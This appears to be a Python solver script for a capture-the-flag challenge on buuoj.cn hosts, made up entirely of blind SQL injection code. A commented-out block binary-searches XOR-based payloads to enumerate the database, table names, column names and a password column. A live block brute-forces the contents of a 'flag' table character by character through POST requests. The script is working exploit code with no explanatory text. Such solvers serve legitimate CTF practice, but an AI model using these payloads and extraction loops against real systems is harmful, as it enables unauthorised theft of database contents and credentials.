# import requests
# import time
# url = 'http://6f69905f-aaba-42af-9326-9086aa162a65.node3.buuoj.cn/search.php?id='
#
# flag = ''
#
# for i in range(1, 1000):
#     left = 32
#     right = 127
#     mid = (left + right) // 2
#     while left < right:
#         # payload = url + '1^(ascii(substr((select(database())),{},1))<{})^1'.format(i, mid)
#         # payload = url + '1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))<{})^1'.format(i, mid)
#         # payload = url + '1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{},1))<{})^1'.format(
#         #      i, mid)
#         payload = url + '1^(ascii(substr((select(group_concat(password))from(F1naI1y)),{},1))<{})^1'.format(i, mid)
#         res = requests.get(payload)
#         if 'others~~~' in res.text:
#             right = mid
#         else:
#             left = mid + 1
#         mid = (left + right) // 2
#         time.sleep(0.5)
#
#     if mid <= 32 or mid >= 127:
#         break
#
#     flag += chr(mid - 1)
#     print(flag)
#
#
#
import requests

url = 'http://79b37a45-baa5-4015-8e6d-bdf539887fe8.node3.buuoj.cn/index.php'

flag = 'Hello, glzjin wants a girlfriend.'

final = ''

for i in range(1, 100):

    stop = 0
    for j in range(32, 129):
        stop = j
        # data = {'id': '(ascii(substr(database(),%d,1))=%d)' % (i, j)}
        data = {'id': '(ascii(substr((select(flag)from(flag)),%d,1))=%d)' % (i, j)}
        re = requests.post(url, data=data).text
        if flag in re:
            final += chr(j)
            print(final)
            break

    if stop >= 128:
        print('*' * 50)
        print(final)
        break